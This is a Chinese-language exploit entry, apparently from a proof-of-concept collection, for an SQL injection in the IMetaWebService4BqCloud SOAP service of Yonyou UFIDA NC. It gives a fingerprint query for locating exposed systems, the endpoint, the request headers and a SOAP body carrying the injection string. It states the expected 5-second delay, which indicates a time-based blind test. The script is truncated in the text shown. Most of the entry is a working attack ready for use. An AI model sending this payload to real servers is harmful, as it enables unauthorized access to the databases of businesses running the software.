# 用友-UFIDA-NCIMetaWebService4BqCloud数据源SQL注入

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=09133CFE3A7B0CE8341AB1A7DEDFCCDE.server`　`SOAPAction: urn:loadFields`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 350`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
<soapenv:Header/>
<soapenv:Body>
<imet:loadFields>
<!--type: string-->
<imet:string>SmartModel^1';*</imet:string>
</imet:loadFields>
</soapenv:Body>
</soapenv:Envelope>
POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
Host:
SOAPAction: urn:loadFields
Content-Type: text/xml;charset=UTF-8
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
<soapenv:…（脚本共 781 字，完整版见原文）
```
- **预期**：200　|　响应时间>=5s